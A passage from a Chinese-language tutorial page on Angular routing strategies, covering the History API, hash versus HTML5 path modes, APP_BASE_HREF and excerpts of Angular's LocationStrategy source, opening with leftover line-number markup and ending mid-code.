</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br><span class="line-number">205</span><br><span class="line-number">206</span><br><span class="line-number">207</span><br><span class="line-number">208</span><br><span class="line-number">209</span><br><span class="line-number">210</span><br><span class="line-number">211</span><br><span class="line-number">212</span><br><span class="line-number">213</span><br><span class="line-number">214</span><br><span class="line-number">215</span><br><span class="line-number">216</span><br><span class="line-number">217</span><br><span class="line-number">218</span><br><span class="line-number">219</span><br><span class="line-number">220</span><br><span class="line-number">221</span><br><span class="line-number">222</span><br><span class="line-number">223</span><br><span class="line-number">224</span><br><span class="line-number">225</span><br><span class="line-number">226</span><br><span class="line-number">227</span><br><span class="line-number">228</span><br><span class="line-number">229</span><br><span class="line-number">230</span><br><span class="line-number">231</span><br><span class="line-number">232</span><br><span class="line-number">233</span><br><span class="line-number">234</span><br><span class="line-number">235</span><br><span class="line-number">236</span><br><span class="line-number">237</span><br><span class="line-number">238</span><br><span class="line-number">239</span><br><span class="line-number">240</span><br><span class="line-number">241</span><br><span class="line-number">242</span><br><span class="line-number">243</span><br><span class="line-number">244</span><br><span class="line-number">245</span><br><span class="line-number">246</span><br><span class="line-number">247</span><br><span class="line-number">248</span><br><span class="line-number">249</span><br><span class="line-number">250</span><br><span class="line-number">251</span><br><span class="line-number">252</span><br><span class="line-number">253</span><br><span class="line-number">254</span><br><span class="line-number">255</span><br><span class="line-number">256</span><br><span class="line-number">257</span><br><span class="line-number">258</span><br><span class="line-number">259</span><br><span class="line-number">260</span><br><span class="line-number">261</span><br><span class="line-number">262</span><br><span class="line-number">263</span><br><span class="line-number">264</span><br><span class="line-number">265</span><br><span class="line-number">266</span><br><span class="line-number">267</span><br><span class="line-number">268</span><br><span class="line-number">269</span><br><span class="line-number">270</span><br><span class="line-number">271</span><br><span class="line-number">272</span><br><span class="line-number">273</span><br><span class="line-number">274</span><br><span class="line-number">275</span><br><span class="line-number">276</span><br><span class="line-number">277</span><br><span class="line-number">278</span><br><span class="line-number">279</span><br><span class="line-number">280</span><br><span class="line-number">281</span><br><span class="line-number">282</span><br><span class="line-number">283</span><br><span class="line-number">284</span><br><span class="line-number">285</span><br><span class="line-number">286</span><br><span class="line-number">287</span><br><span class="line-number">288</span><br><span class="line-number">289</span><br><span class="line-number">290</span><br><span class="line-number">291</span><br><span class="line-number">292</span><br><span class="line-number">293</span><br><span class="line-number">294</span><br><span class="line-number">295</span><br><span class="line-number">296</span><br><span class="line-number">297</span><br><span class="line-number">298</span><br><span class="line-number">299</span><br><span class="line-number">300</span><br><span class="line-number">301</span><br><span class="line-number">302</span><br><span class="line-number">303</span><br><span class="line-number">304</span><br><span class="line-number">305</span><br><span class="line-number">306</span><br><span class="line-number">307</span><br><span class="line-number">308</span><br><span class="line-number">309</span><br><span class="line-number">310</span><br><span class="line-number">311</span><br><span class="line-number">312</span><br><span class="line-number">313</span><br><span class="line-number">314</span><br><span class="line-number">315</span><br><span class="line-number">316</span><br><span class="line-number">317</span><br><span class="line-number">318</span><br><span class="line-number">319</span><br><span class="line-number">320</span><br><span class="line-number">321</span><br><span class="line-number">322</span><br><span class="line-number">323</span><br><span class="line-number">324</span><br><span class="line-number">325</span><br><span class="line-number">326</span><br><span class="line-number">327</span><br><span class="line-number">328</span><br><span class="line-number">329</span><br><span class="line-number">330</span><br><span class="line-number">331</span><br><span class="line-number">332</span><br><span class="line-number">333</span><br><span class="line-number">334</span><br><span class="line-number">335</span><br><span class="line-number">336</span><br><span class="line-number">337</span><br><span class="line-number">338</span><br><span class="line-number">339</span><br><span class="line-number">340</span><br><span class="line-number">341</span><br><span class="line-number">342</span><br><span class="line-number">343</span><br><span class="line-number">344</span><br><span class="line-number">345</span><br><span class="line-number">346</span><br><span class="line-number">347</span><br><span class="line-number">348</span><br><span class="line-number">349</span><br><span class="line-number">350</span><br><span class="line-number">351</span><br><span class="line-number">352</span><br><span class="line-number">353</span><br><span class="line-number">354</span><br><span class="line-number">355</span><br><span class="line-number">356</span><br><span class="line-number">357</span><br><span class="line-number">358</span><br><span class="line-number">359</span><br><span class="line-number">360</span><br><span class="line-number">361</span><br><span class="line-number">362</span><br><span class="line-number">363</span><br><span class="line-number">364</span><br><span class="line-number">365</span><br><span class="line-number">366</span><br><span class="line-number">367</span><br><span class="line-number">368</span><br><span class="line-number">369</span><br><span class="line-number">370</span><br><span class="line-number">371</span><br><span class="line-number">372</span><br><span class="line-number">373</span><br><span class="line-number">374</span><br><span class="line-number">375</span><br><span class="line-number">376</span><br><span class="line-number">377</span><br><span class="line-number">378</span><br><span class="line-number">379</span><br><span class="line-number">380</span><br><span class="line-number">381</span><br><span class="line-number">382</span><br><span class="line-number">383</span><br><span class="line-number">384</span><br><span class="line-number">385</span><br><span class="line-number">386</span><br><span class="line-number">387</span><br><span class="line-number">388</span><br><span class="line-number">389</span><br><span class="line-number">390</span><br><span class="line-number">391</span><br><span class="line-number">392</span><br><span class="line-number">393</span><br><span class="line-number">394</span><br><span class="line-number">395</span><br><span class="line-number">396</span><br><span class="line-number">397</span><br><span class="line-number">398</span><br><span class="line-number">399</span><br><span class="line-number">400</span><br><span class="line-number">401</span><br><span class="line-number">402</span><br><span class="line-number">403</span><br><span class="line-number">404</span><br><span class="line-number">405</span><br><span class="line-number">406</span><br><span class="line-number">407</span><br><span class="line-number">408</span><br><span class="line-number">409</span><br><span class="line-number">410</span><br><span class="line-number">411</span><br><span class="line-number">412</span><br><span class="line-number">413</span><br><span class="line-number">414</span><br><span class="line-number">415</span><br><span class="line-number">416</span><br><span class="line-number">417</span><br><span class="line-number">418</span><br><span class="line-number">419</span><br><span class="line-number">420</span><br><span class="line-number">421</span><br><span class="line-number">422</span><br></div></div><h2 id="路由策略"><a href="#路由策略" class="header-anchor">#</a> 路由策略</h2> <p>对于URL中没有#号，这是因为路由器通过两种 LocationStrategy 提供商来支持不同的URL风格</p> <ul><li>PathLocationStrategy - 默认的策略，支持“HTML 5 pushState”风格。</li> <li>HashLocationStrategy - 支持“hash URL”风格。</li></ul> <h3 id="history-对象"><a href="#history-对象" class="header-anchor">#</a> History 对象</h3> <ol><li>属性</li></ol> <ul><li>length:只读的，其值为一个整数，标志包括当前页面在内的会话历史中的记录数量，比如我们通常打开一个空白窗口，length 为 0，再访问一个页面，其 length 变为 1。</li> <li>scrollRestoration:允许 Web 应用在会话历史导航时显式地设置默认滚动复原，其值为 auto 或 manual。</li> <li>state:只读，返回代表会话历史堆栈顶部记录的任意可序列化类型数据值，我们可以以此来区别不同会话历史纪录。</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>RouterModule.forRoot() 函数把 LocationStrategy 设置成了 PathLocationStrategy，使其成为了默认策略。</p></div> <ol start="2"><li>方法</li></ol> <ul><li>back()
返回会话历史记录中的上一个页面，等价于 window.history.go(-1) 和点击浏览器的后退按钮。</li> <li>forward()
进入会话历史记录中的下一个页面，等价于 window.history.go(1) 和点击浏览器的前进按钮。</li> <li>go()
加载会话历史记录中的某一个页面，通过该页面与当前页面在会话历史中的相对位置定位，如，-1 代表当前页面的上一个记录，1 代表当前页面的下一个页面。若不传参数或传入0，则会重新加载当前页面；若参数超出当前会话历史纪录数，则不进行操作。</li> <li>pushState()
在会话历史堆栈顶部插入一条记录，该方法接收三个参数，一个 state 对象，一个页面标题，一个 URL：
<ul><li>状态对象:存储新添会话历史记录的状态信息对象，每次访问该条会话时，都会触发 popstate 事件，并且事件回调函数会接收一个参数，值为该事件对象的复制副本。状态对象可以是任何可序列化的数据，浏览器将状态对象存储在用户的磁盘以便用户再次重启浏览器时能恢复数据。一个状态对象序列化后的最大长度是 640K，如果传递数据过大，则会抛出异常</li> <li>页面标题:目前该参数值会被忽略，暂不被使用，可以传入空字符串</li> <li>页面 URL:此参数声明新添会话记录的入口 URL,在调用 pushState() 方法后，浏览器不会加载 URL 指向的页面，我们可以在 popstate 事件回调中处理页面是否加载。此 URL 必须与当前页面 URL 同源,，否则会抛异常；其值可以是绝对地址，也可以是相对地址，相对地址会被基于当前页面 URL 解析得到绝对地址；若其值为空，则默认是当前页面 URL</li></ul></li> <li>replaceState()
更新会话历史堆栈顶部记录信息，支持的参数信息与 pushState() 一致。</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>pushState() 与 replaceState() 的区别：pushState()是在 history 栈中添加一个新的条目，replaceState() 是替换当前的记录值。此外这两个方法改变的只是浏览器关于当前页面的标题和 URL 的记录情况，并不会刷新或改变页面展示。</p></div> <p>window的history是只读属性，该属性返回History对象的一个引用，支持我们操作浏览器会话历史记录。出于安全考虑，History对象不允许我们通过JavaScript代码访问其他会话历史记录中其他页面的URL，但是它允许我们在不同页面间进行导航。</p> <h3 id="onpopstate-事件"><a href="#onpopstate-事件" class="header-anchor">#</a> onpopstate 事件</h3> <p>window.onpopstate 是 popstate 事件在 window 对象上的事件句柄。每当处于激活状态的历史记录条目发生变化时，popstate 事件就会在对应 window 对象上触发。如果当前处于激活状态的历史记录条目是由 history.pushState() 方法创建，或者由 history.replaceState() 方法修改过的，则 popstate 事件对象的 state 属性包含了这个历史记录条目的 state 对象的一个拷贝。</p> <p>调用 history.pushState() 或者 history.replaceState() 不会触发 popstate 事件。popstate 事件只会在浏览器某些行为下触发，比如点击后退、前进按钮 (或者在 JavaScript 中调用 history.back()、history.forward()、history.go() 方法)。</p> <p>当网页加载时，各浏览器对 popstate 事件是否触发有不同的表现，Chrome 和 Safari 会触发 popstate 事件，而 Firefox 不会。pushState()方法可以改变URL地址栏，在会话历史堆栈顶部插入一条新会话记录，如：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> stateObj <span class="token operator">=</span> <span class="token punctuation">{</span> foo<span class="token operator">:</span> <span class="token string">&quot;bar&quot;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span>stateObj<span class="token punctuation">,</span> <span class="token string">&quot;page 2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;bar.html&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>假如当前访问页面<code>blog.codingplayboy.com</code>，则执行以上js代码后，浏览器地址栏变为<code>http://blog.codingplayboy.com/bar.html</code></p> <ol><li>若我们点击浏览器的后退按钮，页面也不会变化，只是浏览器的地址栏URL变换为之前的blog.codingplayboy.com；</li> <li>若我们点击跳转到blog.codingplayboy.com/about.html,…</li> <li>我们可以在popstate事件回调中执行我们的任务，但是必须知道的是，只有当当前页面DOM加载完成（即DOMContentLoaded事件发生）后才会触发popstate事件。</li> <li>pushState()方法不会触发hashchange事件，即使URL的hash片段值改变。</li></ol> <h3 id="reload-replace-location"><a href="#reload-replace-location" class="header-anchor">#</a> reload/replace/location</h3> <ol><li>reload()</li></ol> <ul><li>location.reload(beForceGet)
beForceGet，可选，值为true或false；默认为false，表示是否从客户端缓存读取当前页；为true时，则从服务端重新请求页面（相当于F5刷新和history.go(0)方法）。</li></ul> <ol start="2"><li>replace()</li></ol> <ul><li>location.replace(url)
一个相对或绝对URL，使用相对于当前页URL解析后的URL替换当前会话记录的URL，效果与使用history.replaceState()方法修改URL相同；location.replace(url)总是重新请求加载url指向的页面。</li></ul> <ol start="3"><li>location</li></ol> <ul><li>location.href = url或location.assign(url)
可以为location直接设置一个URL值，该值等效于使用pushState()修改URL，会创建一条新会话记录。</li></ul> <h3 id="hash-模式"><a href="#hash-模式" class="header-anchor">#</a> Hash 模式</h3> <p>Hash 模式是基于锚点定位的内部链接机制，在 URL 加上 # ，然后在 # 后面加上 hash 标签，根据不同的标签做定位。示例如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>segmentfault<span class="token punctuation">.</span>com<span class="token operator">/</span>u<span class="token operator">/</span>angular4#user
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="开启-hash-模式"><a href="#开启-hash-模式" class="header-anchor">#</a> 开启 Hash 模式</h3> <ol><li>导入 HashLocationStrategy 及 HashLocationStrategy</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> LocationStrategy<span class="token punctuation">,</span> HashLocationStrategy <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>配置 NgModule - providers</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    BrowserModule<span class="token punctuation">,</span>
    RouterModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span>routes<span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token operator">...</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> LocationStrategy<span class="token punctuation">,</span> useClass<span class="token operator">:</span> HashLocationStrategy <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>URL 中包含的 hash 信息是不会提交到服务端，所以若要使用 SSR (Server-Side Rendered) ，就不能使用 Hash 模式即不能使用 HashLocationStrategy 策略。</p></div> <h3 id="html-5-模式"><a href="#html-5-模式" class="header-anchor">#</a> HTML 5 模式</h3> <p>HTML 5 模式则直接使用跟&quot;真实&quot;的 URL 一样，如上面的路径，在 HTML 5 模式地址如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>segmentfault<span class="token punctuation">.</span>com<span class="token operator">/</span>u<span class="token operator">/</span>angular4<span class="token operator">/</span>user
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>HTML 5 模式下 URL 有两种访问方式：</p> <ul><li>在浏览器地址栏直接输入 URL，这会向服务器请求加载页面。</li> <li>在 Angular 应用程序中，访问 HTML 5 模式下的 URL 地址，这不需要重新加载页面，可以直接切换到对应的视图。</li></ul> <p>在 HTML 5 模式下，Angular 使用了 HTML 5 的 pushState() API 来动态改变浏览器的 URL 而不用重新刷新页面。</p> <h3 id="开启-html-5-模式"><a href="#开启-html-5-模式" class="header-anchor">#</a> 开启 HTML 5 模式</h3> <ol><li>导入 APP_BASE_HREF、LocationStrategy、PathLocationStrategy</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">APP_BASE_HREF</span><span class="token punctuation">,</span> LocationStrategy<span class="token punctuation">,</span> PathLocationStrategy <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ol start="2"><li>配置 NgModule - providers</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    BrowserModule<span class="token punctuation">,</span>
    RouterModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span>routes<span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> LocationStrategy<span class="token punctuation">,</span> useClass<span class="token operator">:</span> PathLocationStrategy <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">APP_BASE_HREF</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> <span class="token string">'/'</span> <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>示例代码中的 APP_BASE_HREF，用于设置资源 (图片、脚本、样式) 加载的基础路径。除了在 NgModule 中配置 provider 外，我们也可以在入口文件，如 index.html 文件 </p><base> 标签中设置基础路径。<p></p> <p><code>&lt;base&gt;</code> 标签为页面上的所有链接规定默认地址或默认目标。通常情况下，浏览器会从当前文档的 URL 中提取相应的路径来补全相对 URL 中缺失的部分。使用 <code>&lt;base&gt;</code> 标签可以改变这一点。浏览器随后将不再使用当前文档的 URL，而使用指定的基本 URL 来解析所有的相对 URL。这其中包括 <code>&lt;a&gt;、&lt;img&gt;、&lt;link&gt;、&lt;form&gt;</code> 标签中的 URL。具体使用示例如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>base href<span class="token operator">=</span><span class="token string">&quot;/&quot;</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="locationstrategy"><a href="#locationstrategy" class="header-anchor">#</a> LocationStrategy</h3> <p>LocationStrategy 用于从浏览器 URL 中读取路由状态。Angular 中提供两种 LocationStrategy 策略：</p> <ul><li>HashLocationStrategy</li> <li>PathLocationStrategy</li></ul> <p>以上两种策略都是继承于 LocationStrategy 抽象类，该类的具体定义如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">LocationStrategy</span> <span class="token punctuation">{</span>
  <span class="token comment">// 获取path路径</span>
  abstract <span class="token function">path</span><span class="token punctuation">(</span>includeHash<span class="token operator">?</span><span class="token operator">:</span> boolean<span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token comment">// 生成完整的外部链接</span>
  abstract <span class="token function">prepareExternalUrl</span><span class="token punctuation">(</span>internal<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token comment">// 添加会话历史状态</span>
  abstract <span class="token function">pushState</span><span class="token punctuation">(</span>state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> url<span class="token operator">:</span> string<span class="token punctuation">,</span> 
      queryParams<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token comment">// 修改会话历史状态</span>
  abstract <span class="token function">replaceState</span><span class="token punctuation">(</span>state<span class="token operator">:</span> any<span class="token punctuation">,</span> title<span class="token operator">:</span> string<span class="token punctuation">,</span> url<span class="token operator">:</span> string<span class="token punctuation">,</span> 
      queryParams<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token comment">// 进入会话历史记录中的下一个页面</span>
  abstract <span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token comment">// 返回会话历史记录中的上一个页面</span>
  abstract <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token comment">// 设置popstate监听</span>
  abstract <span class="token function">onPopState</span><span class="token punctuation">(</span>fn<span class="token operator">:</span> LocationChangeListener<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token comment">// 获取base地址信息</span>
  abstract <span class="token function">getBaseHref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="hashlocationstrategy"><a href="#hashlocationstrategy" class="header-anchor">#</a> HashLocationStrategy</h3> <p>HashLocationStrategy 类继承于 LocationStrategy 抽象类，它的构造函数如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">HashLocationStrategy</span> <span class="token keyword">extends</span> <span class="token class-name">LocationStrategy</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
      <span class="token parameter"><span class="token keyword">private</span> _platformLocation<span class="token operator">:</span> PlatformLocation<span class="token punctuation">,</span>
      @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Inject</span><span class="token punctuation">(</span><span class="token constant">APP_BASE_HREF</span><span class="token punctuation">)</span> _baseHref<span class="token operator">?</span><span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>_baseHref <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>_baseHref <span class="token operator">=</span> _baseHref<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>该构造函数依赖 PlatformLocation 及 APP_BASE_HREF 关联的对象。APP_BASE_HREF 的作用，我们上面已经介绍过了，接下来我们来分析一下 PlatformLocation 对象。</p> <h3 id="platformlocation"><a href="#platformlocation" class="header-anchor">#</a> PlatformLocation</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/platform-browser/src/browser.ts</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">INTERNAL_BROWSER_PLATFORM_PROVIDERS</span><span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token operator">...</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>provide<span class="token operator">:</span> PlatformLocation<span class="token punctuation">,</span> useClass<span class="token operator">:</span> BrowserPlatformLocation<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
